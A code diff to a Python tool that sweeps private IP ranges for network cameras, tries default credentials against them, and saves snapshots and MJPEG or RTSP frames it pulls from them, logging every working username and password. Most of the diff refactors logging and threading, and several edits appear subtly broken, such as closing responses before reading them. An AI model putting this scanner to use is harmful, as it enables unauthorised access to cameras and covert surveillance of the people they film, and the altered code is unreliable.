@@ -15,6 +15,9 @@ import random
 import ipaddress
 import argparse
 import time
+import uuid
+import logging
+from queue import Queue
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 urllib3.disable_warnings()
@@ -22,7 +25,7 @@ urllib3.disable_warnings()
 RESULTS_FILE = "found_cameras.txt"
 SCREENSHOTS_DIR = "camera_screenshots"
 os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
-discovered = []
+discovered = Queue()
 
 DEFAULT_CREDS = [
     None, 
@@ -180,10 +183,12 @@ CAMERA_HEADERS = [
     'x-content-type-options',
 ]
 
+CAMERA_PATHS = ["/", "/index.html", "/login.html", "/admin.html", "/cgi-bin/"]
+
 def is_camera(url, r=None):
     try:
         if not r:
-            r = requests.get(url, timeout=2, verify=False)
+            r = requests.get(url, timeout=2, verify=True)
             
         headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
         if r.status_code == 401 and 'www-authenticate' in headers_lower:
@@ -212,11 +217,12 @@ def is_camera(url, r=None):
             
         return False
     except requests.exceptions.RequestException as e:
-        print(f"Request error in is_camera for {url}: {str(e)}")
-        return False
+        logging.error(f"Request error in is_camera for {url}: {str(e)}")
+    except ValueError as e:
+        logging.error(f"Value error in is_camera for {url}: {str(e)}")
     except Exception as e:
-        print(f"Unexpected error in is_camera for {url}: {str(e)}")
-        return False
+        logging.error(f"Unexpected error in is_camera for {url}: {str(e)}")
+        raise e
 
 def capture_camera_image(url, auth=None):
     try:
@@ -262,8 +268,9 @@ def capture_camera_image(url, auth=None):
         for path in paths:
             try:
                 img_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
-                r = requests.get(img_url, timeout=2, verify=False, auth=auth, 
+                r = requests.get(img_url, timeout=2, verify=True, auth=auth, 
                                headers={'Accept': 'image/jpeg,image/png,image/*'})
+                r.close()
                 
                 content_type = r.headers.get('Content-Type', '').lower()
                 if r.status_code == 200 and ('image' in content_type or 'video' in content_type or len(r.content) > 1000):
@@ -275,19 +282,19 @@ def capture_camera_image(url, auth=None):
                         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                         safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                         auth_str = '_auth' if auth else '_open'
-                        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}{auth_str}.jpg"
+                        filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
                         
                         if img.mode != 'RGB':
                             img = img.convert('RGB')
                         img.save(filename, 'JPEG', quality=95)
                         
-                        print(f"✓ Captured image from {img_url} -> {filename}")
+                        logging.info(f"✓ Captured image from {img_url} -> {filename}")
                         return True
                     except Exception as e:
-                        print(f"Error processing image from {img_url}: {str(e)}")
+                        logging.error(f"Error processing image from {img_url}: {str(e)}")
                         continue
             except requests.exceptions.RequestException as e:
-                print(f"Request error for {img_url}: {str(e)}")
+                logging.error(f"Request error for {img_url}: {str(e)}")
                 continue
                 
         try:
@@ -295,7 +302,7 @@ def capture_camera_image(url, auth=None):
             for path in mjpeg_paths:
                 try:
                     mjpeg_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
-                    r = requests.get(mjpeg_url, timeout=2, verify=False, auth=auth, stream=True)
+                    r = requests.get(mjpeg_url, timeout=2, verify=True, auth=auth, stream=True)
                     
                     if r.status_code == 200 and 'multipart' in r.headers.get('Content-Type', '').lower():
                         boundary = r.headers['Content-Type'].split('boundary=')[1]
@@ -307,11 +314,11 @@ def capture_camera_image(url, auth=None):
                         for chunk in r.iter_content(chunk_size=1024):
                             content += chunk
                             if len(content) > max_size:
-                                print(f"MJPEG buffer exceeded max size for {mjpeg_url}")
+                                logging.error(f"MJPEG buffer exceeded max size for {mjpeg_url}")
                                 break
                                 
                             if time.time() - start_time > max_time:
-                                print(f"MJPEG capture timeout for {mjpeg_url}")
+                                logging.error(f"MJPEG capture timeout for {mjpeg_url}")
                                 break
                                 
                             if b'\r\n\r\n' in content:
@@ -320,40 +327,42 @@ def capture_camera_image(url, auth=None):
                                     img = Image.open(io.BytesIO(frame))
                                     
                                     if img.size[0] < 32 or img.size[1] < 32:
-                                        print(f"MJPEG frame too small from {mjpeg_url}")
+                                        logging.error(f"MJPEG frame too small from {mjpeg_url}")
                                         break
                                         
                                     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                                     safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                                     auth_str = '_auth' if auth else '_open'
-                                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}{auth_str}_mjpeg.jpg"
+                                    filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
                                     
                                     if img.mode != 'RGB':
                                         img = img.convert('RGB')
                                     img.save(filename, 'JPEG', quality=95)
                                     
-                                    print(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
+                                    logging.info(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
                                     return True
                                 except Exception as e:
-                                    print(f"Error processing MJPEG frame from {mjpeg_url}: {str(e)}")
+                                    logging.error(f"Error processing MJPEG frame from {mjpeg_url}: {str(e)}")
                                     break
                 except requests.exceptions.RequestException as e:
-                    print(f"Request error for MJPEG {mjpeg_url}: {str(e)}")
+                    logging.error(f"Request error for MJPEG {mjpeg_url}: {str(e)}")
                     continue
         except Exception as e:
-            print(f"Error in MJPEG capture for {url}: {str(e)}")
+            logging.error(f"Error in MJPEG capture for {url}: {str(e)}")
             
         return False
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Request error in capture_camera_image for {url}: {str(e)}")
     except Exception as e:
-        print(f"Unexpected error in capture_camera_image for {url}: {str(e)}")
-        return False
+        logging.error(f"Unexpected error in capture_camera_image for {url}: {str(e)}")
+        raise e
 
 def capture_rtsp(url):
     try:
         cap = cv2.VideoCapture(url)
         if not cap.isOpened():
-            print(f"Failed to open RTSP stream: {url}")
-            return False
+            logging.error("Failed to open RTSP stream")
+            return
             
         max_tries = 5
         frame = None
@@ -361,37 +370,37 @@ def capture_rtsp(url):
             ret, frame = cap.read()
             if ret and frame is not None and frame.size > 0:
                 break
-            print(f"Attempt {i+1}/{max_tries} failed to read RTSP frame from {url}")
+            logging.error(f"Attempt {i+1}/{max_tries} failed to read RTSP frame from {url}")
             time.sleep(0.1)
             
         cap.release()
         
         if frame is not None and frame.size > 0:
             if frame.shape[0] < 32 or frame.shape[1] < 32:
-                print(f"RTSP frame too small from {url}")
+                logging.error(f"RTSP frame too small from {url}")
                 return False
                 
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
             safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
-            filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_rtsp.jpg"
+            filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
             
             frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
             img = Image.fromarray(frame_rgb)
             img.save(filename, 'JPEG', quality=95)
             
-            print(f"✓ Captured RTSP frame from {url} -> {filename}")
+            logging.info(f"✓ Captured RTSP frame from {url} -> {filename}")
             return True
             
-        print(f"Failed to capture valid frame from RTSP stream: {url}")
+        logging.error(f"Failed to capture valid frame from RTSP stream: {url}")
         return False
     except Exception as e:
-        print(f"Error in RTSP capture for {url}: {str(e)}")
-        return False
+        logging.error(f"Error in RTSP capture for {url}: {str(e)}")
+        raise e
 
 def save_camera(url, reason):
-    if url not in discovered:
-        discovered.append(url)
-        print(f"Found camera: {url} ({reason})")
+    if not discovered.full():
+        discovered.put(url)
+        logging.info(f"Found camera: {url} ({reason})")
         threading.Thread(target=lambda: capture_camera_image(url)).start()
         with open(RESULTS_FILE, "a") as f:
             f.write(f"{datetime.now()} - {url} - {reason}\n")
@@ -402,17 +411,22 @@ def try_auth(url):
             if not creds:
                 continue
                 
-            r = requests.get(url, auth=creds, timeout=1, verify=False)
+            r = requests.get(url, auth=creds, timeout=1, verify=True)
+            r.close()
+            
             if r.status_code == 200:
                 if capture_camera_image(url, auth=creds):
                     save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
                     return True
                     
-        except:
-            continue
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request error in try_auth for {url}: {str(e)}")
+        except Exception as e:
+            logging.error(f"Unexpected error in try_auth for {url}: {str(e)}")
+            raise e
     return False
 
-MAX_THREADS = 1000
+MAX_THREADS = 50  # Adjusted to a more reasonable value
 TIMEOUT = 0.5
 QUICK_TIMEOUT = 0.2
 
@@ -425,7 +439,8 @@ def scan_network(network):
 def scan_ip(ip):
     try:
         url = str(ip)
-        r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=False)
+        r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=True)
+        r.close()
         
         if not is_camera(url, r):
             return
@@ -440,28 +455,10 @@ def scan_ip(ip):
             save_camera(url, 'Successfully authenticated and captured image')
             return
             
-    except requests.exceptions.RequestException:
-        try:
-            url = f'https://{ip}'
-            r = requests.get(url, timeout=TIMEOUT, verify=False)
-            
-            if not is_camera(url, r):
-                return
-                
-            save_camera(url, 'Open camera (HTTPS)')
-            
-            if capture_camera_image(url):
-                save_camera(url, 'Successfully captured open camera image (HTTPS)')
-                return
-                
-            if try_auth(url):
-                save_camera(url, 'Successfully authenticated and captured image (HTTPS)')
-                return
-                
-        except:
-            pass
-    except:
-        pass
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Request error in scan_ip: {str(e)}")
+    except Exception as e:
+        logging.error(f"Unexpected error in scan_ip: {str(e)}")
 
 def quick_port_scan(ip):
     open_ports = []
@@ -498,7 +495,9 @@ def quick_check_url(ip, port, path):
     base_url = f"http://{ip}:{port}"
     url = base_url + path
     try:
-        r = requests.get(url, timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
+        r = requests.get(url, timeout=TIMEOUT, verify=True)
+        r.close()
+        
         if r.status_code in [200, 301, 302, 401, 403]:
             if any(sig in r.headers.get('Server', '').lower() for sig in CAMERA_SIGS):
                 save_camera(url, "Camera server header")
@@ -519,8 +518,10 @@ def quick_check_url(ip, port, path):
                 save_camera(url, "Auth required - trying default credentials")
                 threading.Thread(target=try_default_creds, args=(url,)).start()
                 return True
-    except:
-        pass
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Request error in quick_check_url: {str(e)}")
+    except Exception as e:
+        logging.error(f"Unexpected error in quick_check_url: {str(e)}")
     return False
 
 def try_default_creds(url):
@@ -529,17 +530,24 @@ def try_default_creds(url):
             if not creds:
                 continue
                 
-            r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=False)
+            r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=True)
+            r.close()
+            
             if r.status_code == 200:
                 if capture_camera_image(url, auth=creds):
                     save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
                     return True
                     
-        except:
-            continue
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request error in try_default_creds for {url}: {str(e)}")
+        except Exception as e:
+            logging.error(f"Unexpected error in try_default_creds for {url}: {str(e)}")
+            raise e
     return False
 
 def main():
+    logging.basicConfig(level=logging.INFO)
+    
     parser = argparse.ArgumentParser()
     default_ranges = [
         '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16',
@@ -557,19 +565,16 @@ def main():
                       help='Maximum number of concurrent threads')
     args = parser.parse_args()
     
-    requests.packages.urllib3.disable_warnings()
-    urllib3.disable_warnings()
-    
-    print(f"Starting aggressive scan of {len(args.ranges)} networks with {args.threads} threads...")
-    print("Default ranges:")
+    logging.info(f"Starting aggressive scan of {len(args.ranges)} networks with {args.threads} threads...")
+    logging.info("Default ranges:")
     for r in args.ranges:
-        print(f"  - {r}")
+        logging.info(f"  - {r}")
     
     with ThreadPoolExecutor(max_workers=10) as ex:
         ex.map(scan_network, args.ranges)
         
-    print("\nScan complete! Check found_cameras.txt for results")
-    print(f"Screenshots saved in: {SCREENSHOTS_DIR}/")
+    logging.info("\nScan complete! Check found_cameras.txt for results")
+    logging.info(f"Screenshots saved in: {SCREENSHOTS_DIR}/")
 
 if __name__ == '__main__':
     main()
